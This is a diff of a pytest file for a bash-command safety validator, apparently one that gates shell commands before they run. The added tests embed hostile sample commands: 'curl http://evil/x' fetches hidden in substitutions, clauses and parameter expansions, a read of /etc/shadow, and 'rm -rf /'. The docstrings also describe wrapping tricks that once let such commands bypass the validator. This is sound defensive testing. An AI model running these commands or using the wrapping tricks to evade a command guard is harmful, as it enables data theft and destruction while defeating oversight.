@@ -124,26 +124,16 @@ class TestCorpusOutputParity:
             missing = expected - native[output]
             assert not missing, f"{output}: native tier missed {missing} that bashlex found"
 
-    @pytest.mark.parametrize("name", NATIVE_ONLY_CONSTRUCTS)
-    def test_bashlex_failing_constructs_convert(self, name):
-        """The 7 constructs bashlex rejects must produce an AstView, not a raise."""
-        command = next(e["script"] for e in CORPUS if e["name"] == name)
-        assert native_outputs(command) is not None
-
     @pytest.mark.parametrize(
         "name",
-        [
-            "conditional-double-bracket",
-            "array-assignment",
-            "arithmetic-expansion",
-            "function-definition",
-            "case-statement",
-            "for-loop",
-            "if-statement",
-        ],
+        sorted(
+            set(NATIVE_ONLY_CONSTRUCTS)
+            | {"function-definition", "case-statement", "for-loop", "if-statement"} - set(KNOWN_FALLBACK_CEILINGS)
+        ),
     )
-    def test_t2c_widened_constructs_no_longer_raise(self, name):
-        """Constructs T2b deferred to T2c convert instead of failing closed."""
+    def test_widened_constructs_convert(self, name):
+        """Must produce an AstView, not a raise — the constructs bashlex rejects
+        (the migration's payoff) plus the clauses T2b deferred to T2c."""
         command = next(e["script"] for e in CORPUS if e["name"] == name)
         NativeBridge().parse(command)
 
@@ -210,19 +200,8 @@ class TestFailClosedCeilingsRemain:
         with pytest.raises(UnmappedNodeError):
             NativeBridge().parse(command)
 
-    def test_coprocess_still_raises(self):
-        """`coproc` runs the command behind its own pipes — no bashlex shape."""
-        with pytest.raises(UnmappedNodeError):
-            NativeBridge().parse("coproc x { sleep 1; }")
-
     def test_negation_stays_unmapped_to_preserve_a_deliberate_over_block(self):
-        """Found by the wide parity sweep, not by reasoning about `!` in isolation.
-
-        `substitution.py:_is_valid_pipeline_topology` fails closed on a negated
-        pipeline because bashlex's leading `reservedword` makes the parts count
-        even. Mapping `!` away would hand it a clean pipeline of whitelisted
-        readers and turn bashlex's BLOCK into an ALLOW — weaker, not superset.
-        """
+        """The input that rejected mapping `!` — see convert_stmt for the why."""
         with pytest.raises(UnmappedNodeError, match="Negated"):
             NativeBridge().parse('x="$(! grep -q needle f | wc -l)"')
 
@@ -253,17 +232,107 @@ class TestListFlattening:
 
 
 @needs_binary
+class TestClauseInsideSubstitution:
+    """The axis the corpus never crossed: a newly-mapped clause INSIDE `$( )`.
+
+    Every corpus entry keeps clauses and substitutions in separate commands, so
+    the superset gate went green while `$(if true; then curl evil; fi)` was
+    ALLOWED on the native tier and BLOCKED on bashlex — the whole substitution
+    was dropped because a compound's first child is a reservedword with no
+    `.parts`, so no text rendered and `_create_substitution_node` returned None.
+    Found by the LAB-912 expert panel; fixed in substitution.py.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "V=$(if true; then curl http://evil/x; fi)",
+            "V=$(if false; then :; else curl http://evil/x; fi)",
+            "V=$(while true; do curl http://evil/x; done)",
+            "V=$(until false; do curl http://evil/x; done)",
+            "V=$(for f in x; do curl http://evil/x; done)",
+            "V=$(case x in a) curl http://evil/x ;; esac)",
+            "V=$(f() { curl http://evil/x; })",
+            "cat <(if true; then cat /etc/shadow; fi)",
+            # Same guard, and a hole that predated the native tier entirely:
+            # bashlex emits `compound` for `{ … }` / `( … )` too, so wrapping any
+            # payload in braces used to bypass SubstitutionValidator on BOTH tiers.
+            "V=$({ curl http://evil/x; })",
+            "V=$( (curl http://evil/x) )",
+        ],
+    )
+    def test_wrapped_substitution_is_still_validated(self, command):
+        tiers = [NativeBridge().parse(command)]
+        if bashlex_outputs(command) is not None:  # `case` is unparseable for bashlex
+            tiers.append(BashCommandParser().parse(command))
+        for nodes in tiers:
+            results = _get_substitution_validator().validate_all_substitutions(nodes)
+            assert results, "substitution was dropped entirely — fails OPEN"
+            assert not all(r.allowed for r in results), [r.message for r in results]
+
+    @pytest.mark.parametrize("command", ["V=$(pwd)", "V=$(date)", "V=$(pwd; ls && ls)", "echo $(basename /a/b)"])
+    def test_safe_substitutions_still_allowed(self, command):
+        results = _get_substitution_validator().validate_all_substitutions(NativeBridge().parse(command))
+        assert all(r.allowed for r in results), [r.message for r in results]
+
+
+@needs_binary
+class TestParameterExpansionSubstitutions:
+    """`${z:-$(…)}` and friends EXECUTE their inner substitution.
+
+    A childless `parameter` node hid all four expansion forms from
+    SubstitutionValidator. bashlex misses them too, so this is the superset
+    direction — but T2c turned three of them into a live regression by parsing
+    constructs (`$(( ))`, `[[ ]]`, arrays) whose bashlex ParseError used to
+    fail closed. Found by the LAB-912 expert panel.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "echo ${z:-$(curl http://evil/x)}",  # default value
+            "echo ${z:=$(curl http://evil/x)}",  # assign-default
+            "echo ${z/x/$(curl http://evil/x)}",  # replacement
+            "echo ${z:$(curl http://evil/x):1}",  # substring offset
+            "echo ${a[$(curl http://evil/x)]}",  # subscript
+            "echo $(( ${z:-$(curl http://evil/x)} ))",  # inside arithmetic
+            "[[ -f ${z:-$(curl http://evil/x)} ]]",  # inside a conditional
+            "a=(${z:-$(curl http://evil/x)})",  # inside an array element
+        ],
+    )
+    def test_expansion_substitution_reaches_the_validator(self, command):
+        results = _get_substitution_validator().validate_all_substitutions(NativeBridge().parse(command))
+        assert results, "substitution inside the expansion was invisible"
+        assert not all(r.allowed for r in results), [r.message for r in results]
+
+    def test_plain_expansions_are_untouched(self):
+        for command in ("echo ${z:-fallback}", "echo ${#z}", "echo ${!z}", "echo ${z}", "echo $z"):
+            assert not _get_substitution_validator().extract_substitutions(NativeBridge().parse(command))
+
+
+class TestDeepNestingRoutesToFallback:
+    """A converter stack overflow is a BRIDGE failure, not a verdict.
+
+    bashlex parses ~350 levels of nesting; the recursive converter blows the
+    Python stack first. Escaping as a bare RecursionError would skip T5's router
+    and hard-deny input the fallback tier handles fine.
+    """
+
+    @needs_binary
+    def test_recursion_error_becomes_a_native_bridge_error(self):
+        command = "if true; then " * 400 + "rm -rf /" + "; fi" * 400
+        with pytest.raises(NativeBridgeError):
+            NativeBridge().parse(command)
+
+
+@needs_binary
 class TestKnownBashlexUnderDecode:
     """One divergence the sweep found where native is RIGHT and bashlex is wrong.
 
-    Pinned so T3 inherits it instead of rediscovering it: this is exactly why
-    spec §4 specifies a superset oracle rather than an equality one — an equality
-    gate would pressure the native tier into copying bashlex's decoder bugs.
-
-    It is safe to diverge here. The mangling needs an adjacent literal, so the
-    mangled word always carries that literal too and can never collapse to a bare
-    dangerous command; bashlex's dropped quotes only ever REVEAL text bash would
-    not run. Keeping the quotes loses no danger, it drops a false positive.
+    Pinned so T3 inherits it, and so a bashlex upgrade that changes the fallback
+    tier's decode trips a test. Safe to diverge: the mangling needs an adjacent
+    literal, so the mangled word always carries that literal too and can never
+    collapse to a bare dangerous command.
     """
 
     def test_single_quotes_concatenated_with_a_literal(self):
@@ -328,6 +397,27 @@ class TestParseOnce:
         for segment, literals in parser.extract_command_segments_with_literals(command, ast):
             expected = parser.extract_string_literals(segment, parser.parse(segment))
             assert literals == expected, f"segment {segment!r}"
+
+    def test_heredoc_segment_gains_the_literal_suppression_it_should_have_had(self):
+        """The one deliberate verdict change in the parse-once switch.
+
+        A heredoc segment cannot be parsed standalone (its body sits outside the
+        segment span), so the old per-segment re-parse threw, fell back to NO
+        literals, and matched `rm -rf /` inside a quoted argument — a false
+        positive. Parent-derived ranges make the suppression consistent with
+        every other segment. `cat "rm -rf /"` passes that string as a FILENAME;
+        nothing executes it, so dropping the match is the correct direction.
+        """
+        parser = BashCommandParser()
+        command = 'ls; cat "rm -rf /" <<EOF\nbody\nEOF\n'
+        heredoc_segments = [
+            (text, literals)
+            for text, literals in parser.extract_command_segments_with_literals(command, parser.parse(command))
+            if "<<" in text
+        ]
+        assert heredoc_segments == [('cat "rm -rf /" <<EOF', [(5, 13)])]
+        with pytest.raises(Exception, match="."):  # noqa: B017,PT011 - bashlex's own error type varies
+            parser.parse(heredoc_segments[0][0])
 
     def test_segment_text_is_unchanged_by_the_refactor(self):
         parser = BashCommandParser()
